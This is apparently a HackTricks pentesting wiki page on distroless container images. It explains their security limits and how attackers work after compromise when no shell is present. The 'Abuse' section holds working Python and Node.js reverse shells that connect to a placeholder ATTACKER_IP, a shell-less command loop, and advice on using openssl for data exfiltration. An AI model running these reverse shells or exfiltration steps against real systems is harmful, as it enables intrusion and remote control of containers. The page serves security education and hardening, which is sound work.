# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Overview

A **distroless** container image is an image that ships the **minimum runtime components required to run one specific application**, while intentionally removing the usual distribution tooling such as package managers, shells, and large sets of generic userland utilities. In practice, distroless images often contain only the application binary or runtime, its shared libraries, certificate bundles, and a very small filesystem layout.

The point is not that distroless is a new kernel isolation primitive. Distroless is an **image design strategy**. It changes what is available **inside** the container filesystem, not how the kernel isolates the container. That distinction matters, because distroless hardens the environment mainly by reducing what an attacker can use after gaining code execution. It does not replace namespaces, seccomp, capabilities, AppArmor, SELinux, or any other runtime isolation mechanism.

## Why Distroless Exists

Distroless images are primarily used to reduce:

- the image size
- the operational complexity of the image
- the number of packages and binaries that could contain vulnerabilities
- the number of post-exploitation tools available to an attacker by default

That is why distroless images are popular in production application deployments. A container that contains no shell, no package manager, and almost no generic tooling is usually easier to reason about operationally and harder to abuse interactively after compromise.

Examples of well-known distroless-style image families include:

- Google's distroless images
- Chainguard hardened/minimal images

## What Distroless Does Not Mean

A distroless container is **not**:

- automatically rootless
- automatically non-privileged
- automatically read-only
- automatically protected by seccomp, AppArmor, or SELinux
- automatically safe from container escape

It is still possible to run a distroless image with `--privileged`, host namespace sharing, dangerous bind mounts, or a mounted runtime socket. In that scenario, the image may be minimal, but the container can still be catastrophically insecure. Distroless changes the **userland attack surface**, not the **kernel trust boundary**.

## Typical Operational Characteristics

When you compromise a distroless container, the first thing you usually notice is that common assumptions stop being true. There may be no `sh`, no `bash`, no `ls`, no `id`, no `cat`, and sometimes not even a libc-based environment that behaves the way your usual tradecraft expects. This affects both offense and defense, because the lack of tooling makes debugging, incident response, and post-exploitation different.

The most common patterns are:

- the application runtime exists, but little else does
- shell-based payloads fail because there is no shell
- common enumeration one-liners fail because the helper binaries are missing
- file system protections such as read-only rootfs or `noexec` on writable tmpfs locations are often present as well

That combination is what usually leads people to talk about "weaponizing distroless".

## Distroless And Post-Exploitation

The main offensive challenge in a distroless environment is not always the initial RCE. It is often what comes next. If the exploited workload gives code execution in a language runtime such as Python, Node.js, Java, or Go, you may be able to execute arbitrary logic, but not through the normal shell-centric workflows that are common in other Linux targets.

That means post-exploitation often shifts into one of three directions:

1. **Use the existing language runtime directly** to enumerate the environment, open sockets, read files, or stage additional payloads.
2. **Bring your own tooling into memory** if the filesystem is read-only or writable locations are mounted `noexec`.
3. **Abuse existing binaries already present in the image** if the application or its dependencies include something unexpectedly useful.

## Abuse

### Enumerate The Runtime You Already Have

In many distroless containers there is no shell, but there is still an application runtime. If the target is a Python service, Python is there. If the target is Node.js, Node is there. That often gives enough functionality to enumerate files, read environment variables, open reverse shells, and stage in-memory execution without ever invoking `/bin/sh`.

A simple example with Python:

```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```

A simple example with Node.js:

```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```

Impact:

- recovery of environment variables, often including credentials or service endpoints
- filesystem enumeration without `/bin/ls`
- identification of writable paths and mounted secrets

### Reverse Shell Without `/bin/sh`

If the image does not contain `sh` or `bash`, a classic shell-based reverse shell may fail immediately. In that situation, use the installed language runtime instead.

Python reverse shell:

```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
    os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```

If `/bin/sh` does not exist, replace the final line with direct Python-driven command execution or a Python REPL loop.

Node reverse shell:

```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```

Again, if `/bin/sh` is absent, use Node's filesystem, process, and networking APIs directly instead of spawning a shell.

### Full Example: No-Shell Python Command Loop

If the image has Python but no shell at all, a simple interactive loop is often enough to keep full post-exploitation capability:

```bash
python3 - <<'PY'
import os,subprocess
while True:
    cmd=input("py> ")
    if cmd.strip() in ("exit","quit"):
        break
    p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(p.stdout, end="")
    print(p.stderr, end="")
PY
```

This does not require an interactive shell binary. The impact is effectively the same as a basic shell from the attacker's perspective: command execution, enumeration, and staging of further payloads through the existing runtime.

### In-Memory Tool Execution

Distroless images are often combined with:

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- a lack of package management tools

That combination makes classic "download binary to disk and run it" workflows unreliable. In those cases, memory execution techniques become the main answer.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

The most relevant techniques there are:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Existing Binaries Already In The Image

Some distroless images still contain operationally necessary binaries that become useful after compromise. A repeatedly observed example is `openssl`, because applications sometimes need it for crypto- or TLS-related tasks.

A quick search pattern is:

```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```

If `openssl` is present, it may be usable for:

- outbound TLS connections
- data exfiltration over an allowed egress channel
- staging payload data through encoded/encrypted blobs

The exact abuse depends on what is actually installed, but the general idea is that distroless does not mean "no tools whatsoever"; it means "far fewer tools than a normal distribution image".

## Checks

The goal of these checks is to determine whether the image is really distroless in practice and which runtime or helper binaries are still available for post-exploitation.

```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```

What is interesting here:

- If no shell exists but a runtime such as Python or Node is present, post-exploitation should pivot to runtime-driven execution.
- If the root filesystem is read-only and `/dev/shm` is writable but `noexec`, memory execution techniques become much more relevant.
- If helper binaries such as `openssl`, `busybox`, or `java` exist, they may offer enough functionality to bootstrap further access.

## Runtime Defaults

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Minimal userland by design | No shell, no package manager, only application/runtime dependencies | adding debugging layers, sidecar shells, copying in busybox or tooling |
| Chainguard minimal images | Minimal userland by design | Reduced package surface, often focused on one runtime or service | using `:latest-dev` or debug variants, copying tools during build |
| Kubernetes workloads using distroless images | Depends on Pod config | Distroless affects userland only; Pod security posture still depends on the Pod spec and runtime defaults | adding ephemeral debug containers, host mounts, privileged Pod settings |
| Docker / Podman running distroless images | Depends on run flags | Minimal filesystem, but runtime security still depends on flags and daemon configuration | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

The key point is that distroless is an **image property**, not a runtime protection. Its value comes from reducing what is available inside the filesystem after compromise.

## Related Pages

For filesystem and memory-execution bypasses commonly needed in distroless environments:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

For container runtime, socket, and mount abuse that still applies to distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
